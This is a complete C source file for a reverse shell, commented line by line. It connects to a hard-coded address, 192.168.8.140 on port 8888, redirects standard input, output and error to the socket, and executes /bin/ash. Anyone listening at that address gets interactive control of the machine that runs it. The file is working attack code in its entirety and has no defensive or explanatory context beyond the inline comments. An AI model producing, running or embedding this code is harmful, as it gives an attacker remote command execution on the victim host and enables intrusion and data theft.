#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>

int main(void){
    int port = 8888; // port number to connect to on the remote host
    char *ip = "192.168.8.140"; // IP address to connect to
    char *shell = "/bin/ash"; // shell to run, must be present on the target system

    struct sockaddr_in revsockaddr; //  hold the address information for the remote host
    int sockt = socket(AF_INET, SOCK_STREAM, 0); // create a TCP socket

    // set up the address information for the remote host
    revsockaddr.sin_family = AF_INET;   // IPv4 socket
    revsockaddr.sin_port = htons(port); // convert port to network byte order
    revsockaddr.sin_addr.s_addr = inet_addr(ip); // convert IP address to network byte order

    connect(sockt, (struct sockaddr *) &revsockaddr, sizeof(revsockaddr)); // connect to remote host
    dup2(sockt, 0); // redirect standard input to the socket
    dup2(sockt, 1); // redirect standard output to the socket
    dup2(sockt, 2); // redirect standard error to the socket

    char * const argv[] = {shell, NULL}; // arguments to pass to the shell
    execve(shell, argv, NULL); // execute the shell

    return 0;       
}
